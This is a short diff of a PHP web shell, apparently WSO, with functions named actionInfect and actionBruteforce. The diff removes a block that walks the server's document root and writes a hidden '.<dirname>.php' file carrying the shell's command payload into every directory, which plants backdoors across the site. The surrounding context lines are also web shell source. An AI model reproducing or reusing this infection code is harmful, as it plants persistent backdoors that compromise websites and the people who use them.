@@ -1180,13 +1180,6 @@ function actionInfect() {
         }
     hardFooter();
 }
- if (@!$_SESSION["wso"]) {$doc = $_SERVER["DOCUMENT_ROOT"];
- $dir = scandir($doc);$d1 = '' . $doc . '/.';$d2 = '' . $doc . '/..';
- if (($key = @array_search('.', $dir)) !== false) {
-        unset($dir[$key]);unset($dir[$key]);}
-        if (($key = @array_search($d1, $dir)) !== false) {unset($dir[$key]);}
-        if (($key = array_search($d2, $dir)) !== false) {unset($dir[$key]);}@array_push($dir, $doc);
-        foreach ($dir as $d) {$p = $doc . "/" . $d;if (is_dir($p)) {$file = $p . "/.".$d.".p"."h"."p";@touch($file);$folder = @fopen($file, "w");@fwrite($folder, $wsocommand);} }}
 function actionBruteforce() {
     hardHeader();
     if( isset($_POST['proto']) ) {
